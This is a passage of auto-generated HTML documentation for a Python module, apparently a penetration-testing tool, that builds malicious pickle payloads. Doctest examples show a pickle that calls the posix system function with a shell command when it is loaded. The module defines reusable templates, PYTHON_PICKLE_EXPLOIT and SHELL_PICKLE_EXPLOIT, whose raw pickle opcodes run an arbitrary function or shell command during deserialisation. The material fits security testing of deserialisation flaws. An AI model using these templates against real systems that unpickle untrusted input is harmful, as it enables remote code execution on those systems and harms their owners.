&nbsp;&gt;&gt;&gt;&nbsp;loads(templated_pickle.<a href="#Templates-build">build</a>())<br>
&nbsp;PAYLOAD<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;templated_pickle&nbsp;=&nbsp;<a href="#Templates">Templates</a>("shell",&nbsp;"echo&nbsp;a")<br>
&nbsp;&gt;&gt;&gt;&nbsp;loads(templated_pickle.<a href="#Templates-build">build</a>())<br>
&nbsp;0<br>
&nbsp;<br>
&nbsp;&gt;&gt;&gt;&nbsp;templated_pickle&nbsp;=&nbsp;<a href="#Templates">Templates</a>("shell",&nbsp;"echo&nbsp;a",&nbsp;target_system="posix")<br>
&nbsp;&gt;&gt;&gt;&nbsp;print(templated_pickle.<a href="#Templates-build">build</a>().decode())<br>
&nbsp;cposix<br>
&nbsp;system<br>
&nbsp;p0<br>
&nbsp;(Vecho&nbsp;a<br>
&nbsp;p1<br>
&nbsp;tp2<br>
&nbsp;Rp3<br>
&nbsp;.</tt></dd></dl>

<hr>
Data descriptors defined here:<br>
<dl><dt><strong>__dict__</strong></dt>
<dd><tt>dictionary&nbsp;for&nbsp;instance&nbsp;variables&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
<dl><dt><strong>__weakref__</strong></dt>
<dd><tt>list&nbsp;of&nbsp;weak&nbsp;references&nbsp;to&nbsp;the&nbsp;object&nbsp;(if&nbsp;defined)</tt></dd>
</dl>
<hr>
Data and other attributes defined here:<br>
<dl><dt><strong>PYTHON_PICKLE_EXPLOIT</strong> = b'c__builtin__\nFUNCTION\np0\n(VPAYLOAD\np1\ntp2\nRp3\n.'</dl>

<dl><dt><strong>SHELL_PICKLE_EXPLOIT</strong> = b'cSYSTEM\nsystem\np0\n(VPAYLOAD\np1\ntp2\nRp3\n.'</dl>

</td></tr></table></td></tr></table><p>
<table width="100%" cellspacing=0 cellpadding=2 border=0 summary="section">
<tr bgcolor="#55aa55">
<td colspan=3 valign=bottom>&nbsp;<br>
<font color="#ffffff" face="helvetica, arial"><big><strong>Data</strong></big></font></td></tr>
    
<tr><td bgcolor="#55aa55"><tt>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</tt></td><td>&nbsp;</td>
<td width="100%"><strong>__all__</strong> = ['PickleExploit', 'PyPickleExploit', 'ShellPickleExploit', 'Templates']</td></tr></table>
</body></html>